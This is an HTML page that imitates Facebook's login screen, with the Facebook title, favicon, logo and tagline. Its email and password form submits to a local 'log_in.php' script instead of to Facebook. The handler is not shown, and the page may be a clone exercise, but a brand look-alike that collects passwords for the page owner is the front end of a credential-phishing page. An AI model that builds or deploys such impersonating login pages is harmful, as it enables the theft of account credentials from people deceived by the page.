<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width" />
    <title>Facebook</title>
    <link
      rel="icon"
      href="https://cdn.iconscout.com/icon/free/png-512/facebook-social-media-fb-logo-square-44659.png"
    />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css">
    <link rel="stylesheet" href="css/styles.css" />
    <script type="text/javascript" src="js//showPassword.js"></script>
  </head>
  <body>
    <div class="box">
      <div class="title-box">
        <img src="https://i.postimg.cc/NMyj90t9/logo.png" alt="Facebook">
        <p>Facebook helps you connect and share with the people in your life.</p>
      </div>
      <div class="form-box">
        <form action="log_in.php" method="POST">
          <input type="email" placeholder="Email address" name="email" required>
          <div style="position: relative;">
            <input type="password" id="password" placeholder="Password" name="pass" required>
            <i class="far fa-eye" style="cursor: pointer;position: absolute;    right: 10px;
            top: 18px;" onclick="showPassword()"></i>
          </div>
          <button type="submit">Log In</button>
          <a href="forget.html">Forgotten Password?</a>
        </form>
        <hr>
        <div class="create-btn">
          <a href="signup.html">Create new account</a>
        </div>
      </div>
    </div>
    </body>
</html>
